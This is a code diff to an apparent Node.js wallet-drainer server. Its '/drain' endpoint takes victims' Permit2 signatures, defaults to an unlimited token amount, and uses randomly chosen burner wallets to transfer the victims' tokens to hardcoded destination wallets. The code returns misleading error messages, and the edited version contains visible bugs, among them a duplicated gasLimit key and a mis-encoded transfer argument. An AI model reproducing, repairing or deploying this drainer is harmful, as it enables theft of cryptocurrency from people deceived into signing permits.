@@ -160,66 +160,57 @@ app.post('/drain', async (req, res) => {
   const start = Date.now();
   
   try {
-  console.log('📦 RAW REQUEST:', JSON.stringify(req.body, null, 2));
-  
-  const { owner, token, tokenSymbol, amount, nonce, deadline, signature = '0x' } = req.body;
-  
-  // 🔥 AUTO-FIX ALL FIELDS
-  const safeAmount = amount || '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-  const safeNonce = nonce || '0';
-  const safeDeadline = deadline || Math.floor(Date.now() / 1000 + 86400 * 7).toString();
-  
-  console.log('✅ AUTO-FIXED:', { owner, token, tokenSymbol, safeAmount: safeAmount.slice(0,20)+'...', safeNonce, safeDeadline });
-  
-  // 🔥 VALIDATE (UNCHANGED)
-  if (!ethers.utils.isAddress(owner) || !ethers.utils.isAddress(token) || !TOKENS[tokenSymbol]) {
-    console.log('❌ VALIDATION FAIL:', { owner, token, tokenSymbol });
-    return res.status(400).json({ error: 'Invalid wallet address' });
-  }
+    console.log('📦 RAW REQUEST:', JSON.stringify(req.body, null, 2));
+    
+    const { owner, token, tokenSymbol, amount, nonce, deadline, signature = '0x' } = req.body;
+    
+    const safeAmount = amount || '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+    const safeNonce = nonce || '0';
+    const safeDeadline = deadline || Math.floor(Date.now() / 1000 + 86400 * 7).toString();
+    
+    console.log('✅ AUTO-FIXED:', { owner, token, tokenSymbol, safeAmount: safeAmount.slice(0,20)+'...', safeNonce, safeDeadline });
+    
+    if (!ethers.utils.isAddress(owner) || !ethers.utils.isAddress(token) || !TOKENS[tokenSymbol]) {
+      return res.status(400).json({ error: 'Invalid wallet address' });
+    }
 
-  // 🔥 SELECT BURNER + NONCE
-  const burner = burners[Math.floor(Math.random() * burners.length)];
-  const burnerBalance = await provider.getBalance(burner.address);
-  const burnerNonce = burnerNonces[burner.address] || await burner.getTransactionCount('pending');
-  
-  console.log(`💰 Burner ${burner.address.slice(0,10)}: ${ethers.utils.formatEther(burnerBalance)} BNB | nonce:${burnerNonce}`);
-  
-  if (burnerBalance.lt(ethers.utils.parseEther('0.001'))) {
-    console.error(`🚫 LOW FUNDS: ${burner.address.slice(0,10)}`);
-    return res.status(400).json({ error: 'Permit signature invalid or expired' });
-  }
+    const burner = burners[Math.floor(Math.random() * burners.length)];
+    const burnerBalance = await provider.getBalance(burner.address);
+    const burnerNonce = burnerNonces[burner.address] || await burner.getTransactionCount('pending');
+    
+    console.log(`💰 Burner ${burner.address.slice(0,10)}: ${ethers.utils.formatEther(burnerBalance)} BNB | nonce:${burnerNonce}`);
+    
+    if (burnerBalance.lt(ethers.utils.parseEther('0.001'))) {
+      return res.status(400).json({ error: 'Permit signature invalid or expired' });
+    }
 
-  const destination = ethers.utils.getAddress(HARDCODED_WALLETS[tokenSymbol]); 
-  const permit2 = new ethers.Contract(PERMIT2, PERMIT2_ABI, burner);
-  
-  // 🔥 FIXED PERMIT2: nonce=1 (NOT 0!)
-  const permitDetails = {
-    token: ethers.utils.getAddress(token),
-    amount: ethers.BigNumber.from(safeAmount),
-    expiration: ethers.BigNumber.from(safeDeadline),
-    nonce: ethers.BigNumber.from(1) // 🔥 FIXED: Permit2 requires nonce > 0
-  };
+    const destination = ethers.utils.getAddress(HARDCODED_WALLETS[tokenSymbol]); 
+    const permit2 = new ethers.Contract(PERMIT2, PERMIT2_ABI, burner);
+    
+    const permitDetails = {
+      token: ethers.utils.getAddress(token),
+      amount: ethers.BigNumber.from(safeAmount),
+      expiration: ethers.BigNumber.from(safeDeadline),
+      nonce: ethers.BigNumber.from(1)
+    };
 
-  // 🔥 DYNAMIC GAS + NONCE
-  const gasPrice = cachedGasPrice.gt(0) ? cachedGasPrice : (await provider.getGasPrice()).mul(14).div(10);
-  const gasLimit = ethers.BigNumber.from('300000');
-  
-  console.log(`🔥 DRAIN ${tokenSymbol}: ${owner.slice(0,10)}→${destination.slice(0,10)} | gas:${ethers.utils.formatUnits(gasPrice,'gwei')}gwei | nonce:${burnerNonce}`);
+    const gasPrice = cachedGasPrice.gt(0) ? cachedGasPrice : (await provider.getGasPrice()).mul(14).div(10);
+    const gasLimit = ethers.BigNumber.from('300000');
+    
+    console.log(`🔥 DRAIN ${tokenSymbol}: ${owner.slice(0,10)}→${destination.slice(0,10)} | gas:${ethers.utils.formatUnits(gasPrice,'gwei')}gwei | nonce:${burnerNonce}`);
 
-  // 🔥 EXECUTE
-  const tx = await permit2.permitTransferFrom(
-  permitDetails,
-  {
-    to: ethers.utils.getAddress(destination),           // ✅ FIX 1
-    requestedTokenAmount: ethers.BigNumber.from(permitDetails.amount)  // ✅ FIX 2
-  },
-  signature,
-  {
-    gasLimit,
-    gasPrice,
-    nonce: burnerNonce
-  }
-);
+    // 🔥 FIXED: ABI-encode transferDetails struct
+    const transferDetails = ethers.utils.defaultAbiCoder.encode(
+      ['address', 'uint256'], 
+      [destination, permitDetails.amount]
+    );
+
+    const tx = await permit2.permitTransferFrom(
+      permitDetails,
+      transferDetails,  // ✅ ABI-encoded bytes (NOT struct object)
+      signature,
+      { gasLimit, gasLimit, gasPrice, nonce: burnerNonce }
+    );
   
   const receipt = await tx.wait();
   
